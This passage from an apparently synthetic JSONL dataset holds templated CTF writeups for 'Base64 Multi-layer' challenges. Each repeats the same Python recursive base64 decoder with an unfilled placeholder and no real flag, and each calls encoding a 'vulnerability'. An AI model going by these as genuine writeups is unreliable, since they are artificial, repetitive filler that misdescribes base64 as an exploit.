decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/52", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837170", "synthetic": true}
{"id": "synthetic_encoding_053", "team": "synthetic_team_6", "event": "CTF_2024_Event_20", "challenge_name": "Base64 Multi-layer #54", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/53", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837188", "synthetic": true}
{"id": "synthetic_encoding_054", "team": "synthetic_team_3", "event": "CTF_2024_Event_1", "challenge_name": "Base64 Multi-layer #55", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/54", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837199", "synthetic": true}
{"id": "synthetic_encoding_055", "team": "synthetic_team_1", "event": "CTF_2024_Event_6", "challenge_name": "Base64 Multi-layer #56", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/55", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837212", "synthetic": true}
{"id": "synthetic_encoding_056", "team": "synthetic_team_5", "event": "CTF_2024_Event_3", "challenge_name": "Base64 Multi-layer #57", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/56", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837228", "synthetic": true}
{"id": "synthetic_encoding_057", "team": "synthetic_team_8", "event": "CTF_2024_Event_8", "challenge_name": "Base64 Multi-layer #58", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/57", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837240", "synthetic": true}
{"id": "synthetic_encoding_058", "team": "synthetic_team_1", "event": "CTF_2024_Event_8", "challenge_name": "Base64 Multi-layer #59", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/58", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837252", "synthetic": true}
{"id": "synthetic_encoding_059", "team": "synthetic_team_3", "event": "CTF_2024_Event_7", "challenge_name": "Base64 Multi-layer #60", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/59", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837263", "synthetic": true}
{"id": "synthetic_encoding_060", "team": "synthetic_team_8", "event": "CTF_2024_Event_11", "challenge_name": "Base64 Multi-layer #61", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/60", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837276", "synthetic": true}
{"id": "synthetic_encoding_061", "team": "synthetic_team_4", "event": "CTF_2024_Event_11", "challenge_name": "Base64 Multi-layer #62", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/61", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837287", "synthetic": true}
{"id": "synthetic_encoding_062", "team": "synthetic_team_1", "event": "CTF_2024_Event_17", "challenge_name": "Base64 Multi-layer #63", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/62", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837299", "synthetic": true}
{"id": "synthetic_encoding_063", "team": "synthetic_team_9", "event": "CTF_2024_Event_15", "challenge_name": "Base64 Multi-layer #64", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/63", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837311", "synthetic": true}
{"id": "synthetic_encoding_064", "team": "synthetic_team_1", "event": "CTF_2024_Event_3", "challenge_name": "Base64 Multi-layer #65", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/64", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837323", "synthetic": true}
{"id": "synthetic_encoding_065", "team": "synthetic_team_5", "event": "CTF_2024_Event_11", "challenge_name": "Base64 Multi-layer #66", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/65", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837334", "synthetic": true}
{"id": "synthetic_encoding_066", "team": "synthetic_team_2", "event": "CTF_2024_Event_12", "challenge_name": "Base64 Multi-layer #67", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/66", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837346", "synthetic": true}
